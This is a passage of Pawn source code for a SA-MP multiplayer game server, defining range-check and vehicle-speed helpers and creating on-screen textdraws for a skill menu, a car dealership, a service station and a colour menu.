		else if (((tempposx < radi/2) && (tempposx > -radi/2)) && ((tempposy < radi/2) && (tempposy > -radi/2)) && ((tempposz < radi/2) && (tempposz > -radi/2))) SendClientMessage(i, col4, str);
		else if (((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)) && ((tempposz < radi) && (tempposz > -radi))) SendClientMessage(i, col5, str);
	}
	return 1;
}

stock IsPlayerInRangeOfPlayer(Float:radi, playerid, targetid)
{
	if(IsPlayerConnected(playerid) && IsPlayerConnected(targetid) && !IsPlayerNPC(playerid) && !IsPlayerNPC(targetid))
	{
		new Float:posx, Float:posy, Float:posz;
		GetPlayerPos(targetid, posx, posy, posz);
		if(IsPlayerInRangeOfPoint(playerid, radi, posx, posy, posz)) return 1;
	}
	return 0;
}

stock IsVehicleInRangeOfPoint(vehicleid, Float:distance, Float:x, Float:y, Float:z)
{
	new Float:oldposx, Float:oldposy, Float:oldposz;
	new Float:tempposx, Float:tempposy, Float:tempposz;
	GetVehiclePos(vehicleid, oldposx, oldposy, oldposz);
	tempposx = (oldposx - x);
	tempposy = (oldposy - y);
	tempposz = (oldposz - z);
	if (((tempposx < distance) && (tempposx > -distance)) && ((tempposy < distance) && (tempposy > -distance)) && ((tempposz < distance) && (tempposz > -distance)))return true;
	return false;
}

stock SpeedVehicle(playerid)
{
	new Float:ST[4];
	if(IsPlayerInAnyVehicle(playerid)) GetVehicleVelocity(GetPlayerVehicleID(playerid),ST[0],ST[1],ST[2]);
	else GetPlayerVelocity(playerid,ST[0],ST[1],ST[2]);
	ST[3] = floatsqroot(floatpower(floatabs(ST[0]), 2.0) + floatpower(floatabs(ST[1]), 2.0) + floatpower(floatabs(ST[2]), 2.0)) * 213.3;
	return floatround(ST[3]);
}

stock CreateTextDrawSkill(playerid)
{
	TDEditor_SKILL_PLAYER[playerid][0] = CreatePlayerTextDraw(playerid, 218.998107, 209.662445, "1%");
	PlayerTextDrawLetterSize(playerid, TDEditor_SKILL_PLAYER[playerid][0], 0.241500, 1.060624);
	PlayerTextDrawTextSize(playerid, TDEditor_SKILL_PLAYER[playerid][0], 0.000000, 53.580070);
	PlayerTextDrawAlignment(playerid, TDEditor_SKILL_PLAYER[playerid][0], 2);
	PlayerTextDrawColor(playerid, TDEditor_SKILL_PLAYER[playerid][0], -1);
	PlayerTextDrawUseBox(playerid, TDEditor_SKILL_PLAYER[playerid][0], 1);
	PlayerTextDrawBoxColor(playerid, TDEditor_SKILL_PLAYER[playerid][0], 832044287);
	PlayerTextDrawSetShadow(playerid, TDEditor_SKILL_PLAYER[playerid][0], 0);
	PlayerTextDrawSetOutline(playerid, TDEditor_SKILL_PLAYER[playerid][0], 0);
	PlayerTextDrawBackgroundColor(playerid, TDEditor_SKILL_PLAYER[playerid][0], 255);
	PlayerTextDrawFont(playerid, TDEditor_SKILL_PLAYER[playerid][0], 2);
	PlayerTextDrawSetProportional(playerid, TDEditor_SKILL_PLAYER[playerid][0], 1);
	PlayerTextDrawSetShadow(playerid, TDEditor_SKILL_PLAYER[playerid][0], 0);

	TDEditor_SKILL_PLAYER[playerid][1] = CreatePlayerTextDraw(playerid, 289.702423, 209.662445, "2%");
	PlayerTextDrawLetterSize(playerid, TDEditor_SKILL_PLAYER[playerid][1], 0.241500, 1.060624);
	PlayerTextDrawTextSize(playerid, TDEditor_SKILL_PLAYER[playerid][1], 0.000000, 53.660057);
	PlayerTextDrawAlignment(playerid, TDEditor_SKILL_PLAYER[playerid][1], 2);
	PlayerTextDrawColor(playerid, TDEditor_SKILL_PLAYER[playerid][1], -1);
	PlayerTextDrawUseBox(playerid, TDEditor_SKILL_PLAYER[playerid][1], 1);
	PlayerTextDrawBoxColor(playerid, TDEditor_SKILL_PLAYER[playerid][1], 832044287);
	PlayerTextDrawSetShadow(playerid, TDEditor_SKILL_PLAYER[playerid][1], 0);
	PlayerTextDrawSetOutline(playerid, TDEditor_SKILL_PLAYER[playerid][1], 0);
	PlayerTextDrawBackgroundColor(playerid, TDEditor_SKILL_PLAYER[playerid][1], 255);
	PlayerTextDrawFont(playerid, TDEditor_SKILL_PLAYER[playerid][1], 2);
	PlayerTextDrawSetProportional(playerid, TDEditor_SKILL_PLAYER[playerid][1], 1);
	PlayerTextDrawSetShadow(playerid, TDEditor_SKILL_PLAYER[playerid][1], 0);

	TDEditor_SKILL_PLAYER[playerid][2] = CreatePlayerTextDraw(playerid, 360.006713, 209.662445, "3%");
	PlayerTextDrawLetterSize(playerid, TDEditor_SKILL_PLAYER[playerid][2], 0.241500, 1.060624);
	PlayerTextDrawTextSize(playerid, TDEditor_SKILL_PLAYER[playerid][2], 0.000000, 53.660057);
	PlayerTextDrawAlignment(playerid, TDEditor_SKILL_PLAYER[playerid][2], 2);
	PlayerTextDrawColor(playerid, TDEditor_SKILL_PLAYER[playerid][2], -1);
	PlayerTextDrawUseBox(playerid, TDEditor_SKILL_PLAYER[playerid][2], 1);
	PlayerTextDrawBoxColor(playerid, TDEditor_SKILL_PLAYER[playerid][2], 832044287);
	PlayerTextDrawSetShadow(playerid, TDEditor_SKILL_PLAYER[playerid][2], 0);
	PlayerTextDrawSetOutline(playerid, TDEditor_SKILL_PLAYER[playerid][2], 0);
	PlayerTextDrawBackgroundColor(playerid, TDEditor_SKILL_PLAYER[playerid][2], 255);
	PlayerTextDrawFont(playerid, TDEditor_SKILL_PLAYER[playerid][2], 2);
	PlayerTextDrawSetProportional(playerid, TDEditor_SKILL_PLAYER[playerid][2], 1);
	PlayerTextDrawSetShadow(playerid, TDEditor_SKILL_PLAYER[playerid][2], 0);

	TDEditor_SKILL_PLAYER[playerid][3] = CreatePlayerTextDraw(playerid, 219.106597, 265.237365, "4%");
	PlayerTextDrawLetterSize(playerid, TDEditor_SKILL_PLAYER[playerid][3], 0.241500, 1.060624);
	PlayerTextDrawTextSize(playerid, TDEditor_SKILL_PLAYER[playerid][3], 0.000000, 53.660057);
	PlayerTextDrawAlignment(playerid, TDEditor_SKILL_PLAYER[playerid][3], 2);
	PlayerTextDrawColor(playerid, TDEditor_SKILL_PLAYER[playerid][3], -1);
	PlayerTextDrawUseBox(playerid, TDEditor_SKILL_PLAYER[playerid][3], 1);
	PlayerTextDrawBoxColor(playerid, TDEditor_SKILL_PLAYER[playerid][3], 832044287);
	PlayerTextDrawSetShadow(playerid, TDEditor_SKILL_PLAYER[playerid][3], 0);
	PlayerTextDrawSetOutline(playerid, TDEditor_SKILL_PLAYER[playerid][3], 0);
	PlayerTextDrawBackgroundColor(playerid, TDEditor_SKILL_PLAYER[playerid][3], 255);
	PlayerTextDrawFont(playerid, TDEditor_SKILL_PLAYER[playerid][3], 2);
	PlayerTextDrawSetProportional(playerid, TDEditor_SKILL_PLAYER[playerid][3], 1);
	PlayerTextDrawSetShadow(playerid, TDEditor_SKILL_PLAYER[playerid][3], 0);

	TDEditor_SKILL_PLAYER[playerid][4] = CreatePlayerTextDraw(playerid, 289.510894, 265.237365, "5%");
	PlayerTextDrawLetterSize(playerid, TDEditor_SKILL_PLAYER[playerid][4], 0.241500, 1.060624);
	PlayerTextDrawTextSize(playerid, TDEditor_SKILL_PLAYER[playerid][4], 0.000000, 53.660057);
	PlayerTextDrawAlignment(playerid, TDEditor_SKILL_PLAYER[playerid][4], 2);
	PlayerTextDrawColor(playerid, TDEditor_SKILL_PLAYER[playerid][4], -1);
	PlayerTextDrawUseBox(playerid, TDEditor_SKILL_PLAYER[playerid][4], 1);
	PlayerTextDrawBoxColor(playerid, TDEditor_SKILL_PLAYER[playerid][4], 832044287);
	PlayerTextDrawSetShadow(playerid, TDEditor_SKILL_PLAYER[playerid][4], 0);
	PlayerTextDrawSetOutline(playerid, TDEditor_SKILL_PLAYER[playerid][4], 0);
	PlayerTextDrawBackgroundColor(playerid, TDEditor_SKILL_PLAYER[playerid][4], 255);
	PlayerTextDrawFont(playerid, TDEditor_SKILL_PLAYER[playerid][4], 2);
	PlayerTextDrawSetProportional(playerid, TDEditor_SKILL_PLAYER[playerid][4], 1);
	PlayerTextDrawSetShadow(playerid, TDEditor_SKILL_PLAYER[playerid][4], 0);

	TDEditor_SKILL_PLAYER[playerid][5] = CreatePlayerTextDraw(playerid, 359.915191, 265.237365, "6%");
	PlayerTextDrawLetterSize(playerid, TDEditor_SKILL_PLAYER[playerid][5], 0.241500, 1.060624);
	PlayerTextDrawTextSize(playerid, TDEditor_SKILL_PLAYER[playerid][5], 0.000000, 53.660057);
	PlayerTextDrawAlignment(playerid, TDEditor_SKILL_PLAYER[playerid][5], 2);
	PlayerTextDrawColor(playerid, TDEditor_SKILL_PLAYER[playerid][5], -1);
	PlayerTextDrawUseBox(playerid, TDEditor_SKILL_PLAYER[playerid][5], 1);
	PlayerTextDrawBoxColor(playerid, TDEditor_SKILL_PLAYER[playerid][5], 832044287);
	PlayerTextDrawSetShadow(playerid, TDEditor_SKILL_PLAYER[playerid][5], 0);
	PlayerTextDrawSetOutline(playerid, TDEditor_SKILL_PLAYER[playerid][5], 0);
	PlayerTextDrawBackgroundColor(playerid, TDEditor_SKILL_PLAYER[playerid][5], 255);
	PlayerTextDrawFont(playerid, TDEditor_SKILL_PLAYER[playerid][5], 2);
	PlayerTextDrawSetProportional(playerid, TDEditor_SKILL_PLAYER[playerid][5], 1);
	PlayerTextDrawSetShadow(playerid, TDEditor_SKILL_PLAYER[playerid][5], 0);

	TDEditor_SKILL_PLAYER[playerid][6] = CreatePlayerTextDraw(playerid, 430.098480, 209.987518, "7%");
	PlayerTextDrawLetterSize(playerid, TDEditor_SKILL_PLAYER[playerid][6], 0.241500, 1.060624);
	PlayerTextDrawTextSize(playerid, TDEditor_SKILL_PLAYER[playerid][6], 0.000000, 53.580070);
	PlayerTextDrawAlignment(playerid, TDEditor_SKILL_PLAYER[playerid][6], 2);
	PlayerTextDrawColor(playerid, TDEditor_SKILL_PLAYER[playerid][6], -1);
	PlayerTextDrawUseBox(playerid, TDEditor_SKILL_PLAYER[playerid][6], 1);
	PlayerTextDrawBoxColor(playerid, TDEditor_SKILL_PLAYER[playerid][6], 832044287);
	PlayerTextDrawSetShadow(playerid, TDEditor_SKILL_PLAYER[playerid][6], 0);
	PlayerTextDrawSetOutline(playerid, TDEditor_SKILL_PLAYER[playerid][6], 0);
	PlayerTextDrawBackgroundColor(playerid, TDEditor_SKILL_PLAYER[playerid][6], 255);
	PlayerTextDrawFont(playerid, TDEditor_SKILL_PLAYER[playerid][6], 2);
	PlayerTextDrawSetProportional(playerid, TDEditor_SKILL_PLAYER[playerid][6], 1);
	PlayerTextDrawSetShadow(playerid, TDEditor_SKILL_PLAYER[playerid][6], 0);

	TDEditor_SKILL_PLAYER[playerid][7] = CreatePlayerTextDraw(playerid, 430.098480, 265.390899, "8%");
	PlayerTextDrawLetterSize(playerid, TDEditor_SKILL_PLAYER[playerid][7], 0.241500, 1.060624);
	PlayerTextDrawTextSize(playerid, TDEditor_SKILL_PLAYER[playerid][7], 0.000000, 53.580070);
	PlayerTextDrawAlignment(playerid, TDEditor_SKILL_PLAYER[playerid][7], 2);
	PlayerTextDrawColor(playerid, TDEditor_SKILL_PLAYER[playerid][7], -1);
	PlayerTextDrawUseBox(playerid, TDEditor_SKILL_PLAYER[playerid][7], 1);
	PlayerTextDrawBoxColor(playerid, TDEditor_SKILL_PLAYER[playerid][7], 832044287);
	PlayerTextDrawSetShadow(playerid, TDEditor_SKILL_PLAYER[playerid][7], 0);
	PlayerTextDrawSetOutline(playerid, TDEditor_SKILL_PLAYER[playerid][7], 0);
	PlayerTextDrawBackgroundColor(playerid, TDEditor_SKILL_PLAYER[playerid][7], 255);
	PlayerTextDrawFont(playerid, TDEditor_SKILL_PLAYER[playerid][7], 2);
	PlayerTextDrawSetProportional(playerid, TDEditor_SKILL_PLAYER[playerid][7], 1);
	PlayerTextDrawSetShadow(playerid, TDEditor_SKILL_PLAYER[playerid][7], 0);
}

stock CreateTextDraws(playerid)
{
/*	money_td_player[playerid][0] = CreatePlayerTextDraw(playerid, 614.572021, 80.006706, "usebox");
	PlayerTextDrawLetterSize(playerid, money_td_player[playerid][0], 0.000000, 1.660051);
	PlayerTextDrawTextSize(playerid, money_td_player[playerid][0], 487.142791, 0.000000);
	PlayerTextDrawAlignment(playerid, money_td_player[playerid][0], 1);
	PlayerTextDrawColor(playerid, money_td_player[playerid][0], 255);
	PlayerTextDrawUseBox(playerid, money_td_player[playerid][0], true);
	PlayerTextDrawBoxColor(playerid, money_td_player[playerid][0], 255);
	PlayerTextDrawSetShadow(playerid, money_td_player[playerid][0], 0);
	PlayerTextDrawSetOutline(playerid, money_td_player[playerid][0], 0);
	PlayerTextDrawFont(playerid, money_td_player[playerid][0], 0);

	money_td_player[playerid][1] = CreatePlayerTextDraw(playerid, 613.428405, 81.286666, "usebox");
	PlayerTextDrawLetterSize(playerid, money_td_player[playerid][1], 0.000000, 1.390846);
	PlayerTextDrawTextSize(playerid, money_td_player[playerid][1], 488.285705, 0.000000);
	PlayerTextDrawAlignment(playerid, money_td_player[playerid][1], 1);
	PlayerTextDrawColor(playerid, money_td_player[playerid][1], 0);
	PlayerTextDrawUseBox(playerid, money_td_player[playerid][1], true);
	PlayerTextDrawBoxColor(playerid, money_td_player[playerid][1], -67239681);
	PlayerTextDrawSetShadow(playerid, money_td_player[playerid][1], 0);
	PlayerTextDrawSetOutline(playerid, money_td_player[playerid][1], 0);
	PlayerTextDrawFont(playerid, money_td_player[playerid][1], 0);

	money_td_player[playerid][2] = CreatePlayerTextDraw(playerid, 613.047668, 81.713333, "usebox");
	PlayerTextDrawLetterSize(playerid, money_td_player[playerid][2], 0.000000, 1.285873);
	PlayerTextDrawTextSize(playerid, money_td_player[playerid][2], 488.666656, 0.000000);
	PlayerTextDrawAlignment(playerid, money_td_player[playerid][2], 1);
	PlayerTextDrawColor(playerid, money_td_player[playerid][2], 0);
	PlayerTextDrawUseBox(playerid, money_td_player[playerid][2], true);
	PlayerTextDrawBoxColor(playerid, money_td_player[playerid][2], 255);
	PlayerTextDrawSetShadow(playerid, money_td_player[playerid][2], 0);
	PlayerTextDrawSetOutline(playerid, money_td_player[playerid][2], 0);
	PlayerTextDrawFont(playerid, money_td_player[playerid][2], 0);

	money_td_player[playerid][3] = CreatePlayerTextDraw(playerid, 476.190399, 74.240005, "ld_beat:chit");
	PlayerTextDrawLetterSize(playerid, money_td_player[playerid][3], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, money_td_player[playerid][3], 25.523792, 26.880008);
	PlayerTextDrawAlignment(playerid, money_td_player[playerid][3], 1);
	PlayerTextDrawColor(playerid, money_td_player[playerid][3], 255);
	PlayerTextDrawSetShadow(playerid, money_td_player[playerid][3], 0);
	PlayerTextDrawSetOutline(playerid, money_td_player[playerid][3], 0);
	PlayerTextDrawFont(playerid, money_td_player[playerid][3], 4);

	money_td_player[playerid][4] = CreatePlayerTextDraw(playerid, 477.714324, 75.520004, "ld_beat:chit");
	PlayerTextDrawLetterSize(playerid, money_td_player[playerid][4], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, money_td_player[playerid][4], 23.238094, 23.893333);
	PlayerTextDrawAlignment(playerid, money_td_player[playerid][4], 1);
	PlayerTextDrawColor(playerid, money_td_player[playerid][4], -67239681);
	PlayerTextDrawSetShadow(playerid, money_td_player[playerid][4], 0);
	PlayerTextDrawSetOutline(playerid, money_td_player[playerid][4], 0);
	PlayerTextDrawFont(playerid, money_td_player[playerid][4], 4);

	money_td_player[playerid][5] = CreatePlayerTextDraw(playerid, 478.857177, 75.946685, "LD_BEAT:chit");
	PlayerTextDrawLetterSize(playerid, money_td_player[playerid][5], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, money_td_player[playerid][5], 22.476198, 23.039997);
	PlayerTextDrawAlignment(playerid, money_td_player[playerid][5], 1);
	PlayerTextDrawColor(playerid, money_td_player[playerid][5], 255);
	PlayerTextDrawSetShadow(playerid, money_td_player[playerid][5], 0);
	PlayerTextDrawSetOutline(playerid, money_td_player[playerid][5], 0);
	PlayerTextDrawFont(playerid, money_td_player[playerid][5], 4);

	money_td_player[playerid][6] = CreatePlayerTextDraw(playerid, 486.857238, 79.786659, "$");
	PlayerTextDrawLetterSize(playerid, money_td_player[playerid][6], 0.352095, 1.570134);
	PlayerTextDrawAlignment(playerid, money_td_player[playerid][6], 1);
	PlayerTextDrawColor(playerid, money_td_player[playerid][6], 866792447);
	PlayerTextDrawSetShadow(playerid, money_td_player[playerid][6], 1);
	PlayerTextDrawSetOutline(playerid, money_td_player[playerid][6], 0);
	PlayerTextDrawBackgroundColor(playerid, money_td_player[playerid][6], 51);
	PlayerTextDrawFont(playerid, money_td_player[playerid][6], 3);
	PlayerTextDrawSetProportional(playerid, money_td_player[playerid][6], 1);

	money_td_player[playerid][7] = CreatePlayerTextDraw(playerid, 498.000000, 81.713424, "usebox");
	PlayerTextDrawLetterSize(playerid, money_td_player[playerid][7], 0.000000, 1.286719);
	PlayerTextDrawTextSize(playerid, money_td_player[playerid][7], 494.761901, 0.000000);
	PlayerTextDrawAlignment(playerid, money_td_player[playerid][7], 1);
	PlayerTextDrawColor(playerid, money_td_player[playerid][7], -67239681);
	PlayerTextDrawUseBox(playerid, money_td_player[playerid][7], true);
	PlayerTextDrawBoxColor(playerid, money_td_player[playerid][7], -67239681);
	PlayerTextDrawSetShadow(playerid, money_td_player[playerid][7], 0);
	PlayerTextDrawSetOutline(playerid, money_td_player[playerid][7], 0);
	PlayerTextDrawFont(playerid, money_td_player[playerid][7], 0);

	money_td_player[playerid][8] = CreatePlayerTextDraw(playerid, 505.142791, 79.360023, "100000000");
	PlayerTextDrawLetterSize(playerid, money_td_player[playerid][8], 0.283142, 1.587200);
	PlayerTextDrawAlignment(playerid, money_td_player[playerid][8], 1);
	PlayerTextDrawColor(playerid, money_td_player[playerid][8], -1);
	PlayerTextDrawSetShadow(playerid, money_td_player[playerid][8], 1);
	PlayerTextDrawSetOutline(playerid, money_td_player[playerid][8], 0);
	PlayerTextDrawBackgroundColor(playerid, money_td_player[playerid][8], 51);
	PlayerTextDrawFont(playerid, money_td_player[playerid][8], 2);
	PlayerTextDrawSetProportional(playerid, money_td_player[playerid][8], 1);*/

	sto_td_player[0][playerid] = CreatePlayerTextDraw(playerid, 510.550079, 175.519973, "‰BEЏ"); // second block > header
	PlayerTextDrawLetterSize(playerid, sto_td_player[0][playerid], 0.174346, 1.198474);
	PlayerTextDrawAlignment(playerid, sto_td_player[0][playerid], 2);
	PlayerTextDrawColor(playerid, sto_td_player[0][playerid], -1);
	PlayerTextDrawSetShadow(playerid, sto_td_player[0][playerid], 0);
	PlayerTextDrawSetOutline(playerid, sto_td_player[0][playerid], 0);
	PlayerTextDrawBackgroundColor(playerid, sto_td_player[0][playerid], 51);
	PlayerTextDrawFont(playerid, sto_td_player[0][playerid], 2);
	PlayerTextDrawSetProportional(playerid, sto_td_player[0][playerid], 1);

	sto_td_player[1][playerid] = CreatePlayerTextDraw(playerid, 463.400146, 189.743927, "…CЊO‡’€Y• “‡E–EмЏ‘ …мЏEPЃE†CA,~n~B‘ЂEP…ЏE ЊPEѓЊOЌ…ЏAE–‘† ‰BEЏ~n~ѓ‡• ‡…ЌмO‚O ABЏO–OЂ…‡•."); // second block > descriprion
	PlayerTextDrawLetterSize(playerid, sto_td_player[1][playerid], 0.125000, 0.800000);
	PlayerTextDrawAlignment(playerid, sto_td_player[1][playerid], 1);
	PlayerTextDrawColor(playerid, sto_td_player[1][playerid], -1);
	PlayerTextDrawSetShadow(playerid, sto_td_player[1][playerid], 0);
	PlayerTextDrawSetOutline(playerid, sto_td_player[1][playerid], 0);
	PlayerTextDrawBackgroundColor(playerid, sto_td_player[1][playerid], 51);
	PlayerTextDrawFont(playerid, sto_td_player[1][playerid], 2);
	PlayerTextDrawSetProportional(playerid, sto_td_player[1][playerid], 1);

	sto_td_player[2][playerid] = CreatePlayerTextDraw(playerid, 464.000305, 236.671905, "OCмOBмO† ‰BEЏ: 24~n~ѓOЊ.‰BEЏ: 52~n~K OЈћAЏE: 200 PYЂ."); // second block > selected parameters
	PlayerTextDrawLetterSize(playerid, sto_td_player[2][playerid], 0.125000, 0.800000);
	PlayerTextDrawAlignment(playerid, sto_td_player[2][playerid], 1);
	PlayerTextDrawColor(playerid, sto_td_player[2][playerid], -805306369);
	PlayerTextDrawSetShadow(playerid, sto_td_player[2][playerid], 0);
	PlayerTextDrawSetOutline(playerid, sto_td_player[2][playerid], 0);
	PlayerTextDrawBackgroundColor(playerid, sto_td_player[2][playerid], 51);
	PlayerTextDrawFont(playerid, sto_td_player[2][playerid], 2);
	PlayerTextDrawSetProportional(playerid, sto_td_player[2][playerid], 1);

	autosalon_player_td[playerid][0] = CreatePlayerTextDraw(playerid, 571.399902, 165.699798, "10000000$");
	PlayerTextDrawLetterSize(playerid, autosalon_player_td[playerid][0], 0.257499, 1.225625);
	PlayerTextDrawAlignment(playerid, autosalon_player_td[playerid][0], 2);
	PlayerTextDrawColor(playerid, autosalon_player_td[playerid][0], -1);
	PlayerTextDrawSetShadow(playerid, autosalon_player_td[playerid][0], 0);
	PlayerTextDrawSetOutline(playerid, autosalon_player_td[playerid][0], 0);
	PlayerTextDrawBackgroundColor(playerid, autosalon_player_td[playerid][0], 255);
	PlayerTextDrawFont(playerid, autosalon_player_td[playerid][0], 2);
	PlayerTextDrawSetProportional(playerid, autosalon_player_td[playerid][0], 1);
	PlayerTextDrawSetShadow(playerid, autosalon_player_td[playerid][0], 0);

	autosalon_player_td[playerid][1] = CreatePlayerTextDraw(playerid, 570.875976, 192.774902, "HONTRING_B");
	PlayerTextDrawLetterSize(playerid, autosalon_player_td[playerid][1], 0.174500, 0.965623);
	PlayerTextDrawTextSize(playerid, autosalon_player_td[playerid][1], 0.000000, 10.000000);
	PlayerTextDrawAlignment(playerid, autosalon_player_td[playerid][1], 2);
	PlayerTextDrawColor(playerid, autosalon_player_td[playerid][1], -1);
	PlayerTextDrawUseBox(playerid, autosalon_player_td[playerid][1], 1);
	PlayerTextDrawBoxColor(playerid, autosalon_player_td[playerid][1], 0);
	PlayerTextDrawSetShadow(playerid, autosalon_player_td[playerid][1], 0);
	PlayerTextDrawSetOutline(playerid, autosalon_player_td[playerid][1], 0);
	PlayerTextDrawBackgroundColor(playerid, autosalon_player_td[playerid][1], 255);
	PlayerTextDrawFont(playerid, autosalon_player_td[playerid][1], 2);
	PlayerTextDrawSetProportional(playerid, autosalon_player_td[playerid][1], 1);
	PlayerTextDrawSetShadow(playerid, autosalon_player_td[playerid][1], 0);

	autosalon_ptd_first[playerid] = CreatePlayerTextDraw(playerid, 318.999969, 368.355438, "Lamborghini Centario");
	PlayerTextDrawLetterSize(playerid, autosalon_ptd_first[playerid], 0.270666, 1.297185);
	PlayerTextDrawAlignment(playerid, autosalon_ptd_first[playerid], 2);
	PlayerTextDrawColor(playerid, autosalon_ptd_first[playerid], -1);
	PlayerTextDrawSetShadow(playerid, autosalon_ptd_first[playerid], 0);
	PlayerTextDrawSetOutline(playerid, autosalon_ptd_first[playerid], 0);
	PlayerTextDrawBackgroundColor(playerid, autosalon_ptd_first[playerid], 51);
	PlayerTextDrawFont(playerid, autosalon_ptd_first[playerid], 1);
	PlayerTextDrawSetProportional(playerid, autosalon_ptd_first[playerid], 1);

	autosalon_ptd_second[playerid] = CreatePlayerTextDraw(playerid, 313.666748, 396.148132, "300000000");
	PlayerTextDrawLetterSize(playerid, autosalon_ptd_second[playerid], 0.162000, 0.928000);
	PlayerTextDrawAlignment(playerid, autosalon_ptd_second[playerid], 2);
	PlayerTextDrawColor(playerid, autosalon_ptd_second[playerid], 255);
	PlayerTextDrawSetShadow(playerid, autosalon_ptd_second[playerid], 0);
	PlayerTextDrawSetOutline(playerid, autosalon_ptd_second[playerid], 0);
	PlayerTextDrawBackgroundColor(playerid, autosalon_ptd_second[playerid], 51);
	PlayerTextDrawFont(playerid, autosalon_ptd_second[playerid], 1);
	PlayerTextDrawSetProportional(playerid, autosalon_ptd_second[playerid], 1);

	color_menu_player_td[playerid][0] = CreatePlayerTextDraw(playerid, 223.700042, 197.200225, "LD_BEAT:Chit");
	PlayerTextDrawLetterSize(playerid, color_menu_player_td[playerid][0], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, color_menu_player_td[playerid][0], 37.269618, 31.979999);
	PlayerTextDrawAlignment(playerid, color_menu_player_td[playerid][0], 1);
	PlayerTextDrawColor(playerid, color_menu_player_td[playerid][0], -1523963137);
	PlayerTextDrawSetShadow(playerid, color_menu_player_td[playerid][0], 0);
	PlayerTextDrawSetOutline(playerid, color_menu_player_td[playerid][0], 0);
	PlayerTextDrawBackgroundColor(playerid, color_menu_player_td[playerid][0], 255);
	PlayerTextDrawFont(playerid, color_menu_player_td[playerid][0], 4);
	PlayerTextDrawSetProportional(playerid, color_menu_player_td[playerid][0], 0);
	PlayerTextDrawSetShadow(playerid, color_menu_player_td[playerid][0], 0);
	PlayerTextDrawSetSelectable(playerid, color_menu_player_td[playerid][0], true);

	color_menu_player_td[playerid][1] = CreatePlayerTextDraw(playerid, 261.100097, 197.262756, "LD_BEAT:Chit");
	PlayerTextDrawLetterSize(playerid, color_menu_player_td[playerid][1], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, color_menu_player_td[playerid][1], 37.269618, 31.979999);
	PlayerTextDrawAlignment(playerid, color_menu_player_td[playerid][1], 1);
	PlayerTextDrawColor(playerid, color_menu_player_td[playerid][1], -1523963137);
	PlayerTextDrawSetShadow(playerid, color_menu_player_td[playerid][1], 0);
	PlayerTextDrawSetOutline(playerid, color_menu_player_td[playerid][1], 0);
	PlayerTextDrawBackgroundColor(playerid, color_menu_player_td[playerid][1], 255);
	PlayerTextDrawFont(playerid, color_menu_player_td[playerid][1], 4);
	PlayerTextDrawSetProportional(playerid, color_menu_player_td[playerid][1], 0);
	PlayerTextDrawSetShadow(playerid, color_menu_player_td[playerid][1], 0);
	PlayerTextDrawSetSelectable(playerid, color_menu_player_td[playerid][1], true);

	color_menu_player_td[playerid][2] = CreatePlayerTextDraw(playerid, 299.000366, 197.212646, "LD_BEAT:Chit");
	PlayerTextDrawLetterSize(playerid, color_menu_player_td[playerid][2], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, color_menu_player_td[playerid][2], 37.269618, 31.979999);
	PlayerTextDrawAlignment(playerid, color_menu_player_td[playerid][2], 1);
	PlayerTextDrawColor(playerid, color_menu_player_td[playerid][2], -1523963137);
	PlayerTextDrawSetShadow(playerid, color_menu_player_td[playerid][2], 0);
	PlayerTextDrawSetOutline(playerid, color_menu_player_td[playerid][2], 0);
	PlayerTextDrawBackgroundColor(playerid, color_menu_player_td[playerid][2], 255);
	PlayerTextDrawFont(playerid, color_menu_player_td[playerid][2], 4);
	PlayerTextDrawSetProportional(playerid, color_menu_player_td[playerid][2], 0);
	PlayerTextDrawSetShadow(playerid, color_menu_player_td[playerid][2], 0);
	PlayerTextDrawSetSelectable(playerid, color_menu_player_td[playerid][2], true);

	color_menu_player_td[playerid][3] = CreatePlayerTextDraw(playerid, 337.400451, 197.250122, "LD_BEAT:Chit");
	PlayerTextDrawLetterSize(playerid, color_menu_player_td[playerid][3], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, color_menu_player_td[playerid][3], 37.269618, 31.979999);
	PlayerTextDrawAlignment(playerid, color_menu_player_td[playerid][3], 1);
	PlayerTextDrawColor(playerid, color_menu_player_td[playerid][3], -1523963137);
	PlayerTextDrawSetShadow(playerid, color_menu_player_td[playerid][3], 0);
	PlayerTextDrawSetOutline(playerid, color_menu_player_td[playerid][3], 0);
	PlayerTextDrawBackgroundColor(playerid, color_menu_player_td[playerid][3], 255);
	PlayerTextDrawFont(playerid, color_menu_player_td[playerid][3], 4);
	PlayerTextDrawSetProportional(playerid, color_menu_player_td[playerid][3], 0);
	PlayerTextDrawSetShadow(playerid, color_menu_player_td[playerid][3], 0);
	PlayerTextDrawSetSelectable(playerid, color_menu_player_td[playerid][3], true);

	color_menu_player_td[playerid][4] = CreatePlayerTextDraw(playerid, 375.600433, 197.187591, "LD_BEAT:Chit");
	PlayerTextDrawLetterSize(playerid, color_menu_player_td[playerid][4], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, color_menu_player_td[playerid][4], 37.269618, 31.979999);
	PlayerTextDrawAlignment(playerid, color_menu_player_td[playerid][4], 1);
	PlayerTextDrawColor(playerid, color_menu_player_td[playerid][4], -1523963137);
	PlayerTextDrawSetShadow(playerid, color_menu_player_td[playerid][4], 0);
	PlayerTextDrawSetOutline(playerid, color_menu_player_td[playerid][4], 0);
	PlayerTextDrawBackgroundColor(playerid, color_menu_player_td[playerid][4], 255);
	PlayerTextDrawFont(playerid, color_menu_player_td[playerid][4], 4);
	PlayerTextDrawSetProportional(playerid, color_menu_player_td[playerid][4], 0);
	PlayerTextDrawSetShadow(playerid, color_menu_player_td[playerid][4], 0);
	PlayerTextDrawSetSelectable(playerid, color_menu_player_td[playerid][4], true);

	color_menu_player_td[playerid][5] = CreatePlayerTextDraw(playerid, 223.600494, 227.887542, "LD_BEAT:Chit");
	PlayerTextDrawLetterSize(playerid, color_menu_player_td[playerid][5], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, color_menu_player_td[playerid][5], 37.269618, 31.979999);
	PlayerTextDrawAlignment(playerid, color_menu_player_td[playerid][5], 1);
	PlayerTextDrawColor(playerid, color_menu_player_td[playerid][5], -1523963137);
	PlayerTextDrawSetShadow(playerid, color_menu_player_td[playerid][5], 0);
	PlayerTextDrawSetOutline(playerid, color_menu_player_td[playerid][5], 0);
	PlayerTextDrawBackgroundColor(playerid, color_menu_player_td[playerid][5], 255);
